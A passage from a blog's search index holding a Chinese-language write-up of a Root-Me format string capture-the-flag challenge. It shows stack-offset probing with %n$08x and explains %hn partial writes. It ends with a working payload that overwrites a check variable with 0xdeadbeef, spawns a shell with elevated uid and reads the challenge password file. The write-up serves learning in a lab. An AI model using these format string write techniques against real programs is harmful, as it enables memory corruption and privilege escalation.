class="string">&quot;check=0x%x\n&quot;</span>, check );</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (check==<span class="number">0xdeadbeef</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Yeah dude ! You win !\n&quot;</span>);</span><br><span class="line">                setreuid(geteuid(), geteuid());</span><br><span class="line">                system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">Download</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="try"><a href="#try" class="headerlink" title="try"></a>try</h3><pre><code>app-systeme-ch14@challenge02:~$ (for i in `seq 1 10`; do ./ch14 &quot;%$i&quot;&#39;$08x&#39;; ech
-o;done)
-check at 0xbffffae8
-argv[1] = [%1$08x]
-fmt=[080485f1]
-check=0x4030201
-
-check at 0xbffffae8
-argv[1] = [%2$08x]
-fmt=[00000000]
-check=0x4030201
-
-check at 0xbffffae8
-argv[1] = [%3$08x]
-fmt=[00000000]
-check=0x4030201
-
-check at 0xbffffae8
-argv[1] = [%4$08x]
-fmt=[000000c2]
-check=0x4030201
-
-check at 0xbffffae8
-argv[1] = [%5$08x]
-fmt=[bffffc34]
-check=0x4030201
-
-check at 0xbffffae8
-argv[1] = [%6$08x]
-fmt=[b7fe1439]
-check=0x4030201
-
-check at 0xbffffae8
-argv[1] = [%7$08x]
-fmt=[f63d4e2e]
-check=0x4030201
-
-check at 0xbffffae8
-argv[1] = [%8$08x]
-fmt=[04030201]
-check=0x4030201
-
-check at 0xbffffae8
-argv[1] = [%9$08x]
-fmt=[00000000]
-check=0x4030201
-
-check at 0xbffffae8
-argv[1] = [%10$08x]
-fmt=[00000000]
-check=0x4030201</code></pre>
-<p>第<code>8</code>处存着<code>check</code></p>
-<hr>
-<pre><code>(for i in `seq 1 12`; do ./format_2 &quot;AAAA%$i&quot;&#39;$08x&#39;;echo;done)
-
-
-check at 0xbffffae8
-argv[1] = [AAAA%8$08x]
-fmt=[AAAA04030201]
-check=0x4030201
-
-check at 0xbffffae8
-argv[1] = [AAAA%9$08x]
-fmt=[AAAA41414141]
-check=0x4030201
-
-check at 0xbffffae8
-argv[1] = [ABCD%8$08x]
-fmt=[ABCD04030201]
-check=0x4030201
-
-check at 0xbffffae8
-argv[1] = [ABCD%9$08x]
-fmt=[ABCD44434241]
-check=0x4030201</code></pre>
-<p>输入值在第九处(小端序)<br>check 在第八处</p>
-<hr>
-<h3 id="hn"><a href="#hn" class="headerlink" title="%hn"></a>%hn</h3><p>use <code>%hn</code> to write only 2 bytes at a time.</p>
-<pre><code>%n          一次性写入 4 个字节
-
-%hn         一次性写入 2 个字节
-
-%hhn        一次性写入 1 个字节</code></pre>
-<p>./a.out “$(python -c ‘import sys; sys.stdout.write(“CAAAAAAA<code>%2044x%10$hn</code>%38912x%11$hn”)’)”<br><a href="https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html">https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html</a></p>
-<p><del>printf (“\x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x|%s|”);</del></p>
-<p><del>./format_2 $(python2 -c ‘print “\xd8\xfa\xff\xbf%9$08s”‘)</del></p>
-<hr>
-<h3 id="final"><a href="#final" class="headerlink" title="final"></a>final</h3><pre><code>app-systeme-ch14@challenge02:~$ ./ch14 &quot;$(python -c &#39;print &quot;\xd8\xfa\xff\xbf%9$x
-&quot;&#39;)&quot;
-check at 0xbffffae8
-argv[1] = [Øúÿ¿%9$x]
-fmt=[Øúÿ¿bffffad8]
-check=0x4030201
-
-app-systeme-ch14@challenge02:~$ ./ch14 &quot;$(python -c &#39;print &quot;\xd8\xfa\xff\xbf%9$s
-&quot;&#39;)&quot;
-check at 0xbffffae8
-argv[1] = [Øúÿ¿%9$s]
-fmt=[Øúÿ¿Â]
-check=0x4030201</code></pre>
-<hr>
-<p>\xdead=57005<br>\xbeef=48879<br>\xdead-\xbeef=8126<br>第九处写\xbeef 48879-8<br>第十处写\xdead 8126(已经输出了48879)</p>
-<pre><code>app-systeme-ch14@challenge02:~$ ./ch14 $(python -c &#39;print &quot;\xc8\xfa\xff\xbf\xca\
-xfa\xff\xbf%48871x%9$hn&quot;+&quot;%8126x%10$hn&quot;&#39;)
-check at 0xbffffac8
-argv[1] = [Èúÿ¿Êúÿ¿%48871x%9$hn%8126x%10$hn]
-fmt=[Èúÿ¿Êúÿ¿
-                                                    ]
-check=0xdeadbeef
-Yeah dude ! You win !
-app-systeme-ch14-cracked@challenge02:~$ cat .passwd</code></pre>
-]]></content>
-      <categories>
-        <category>APP system in root_me</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
       </tags>
   </entry>
 </search>
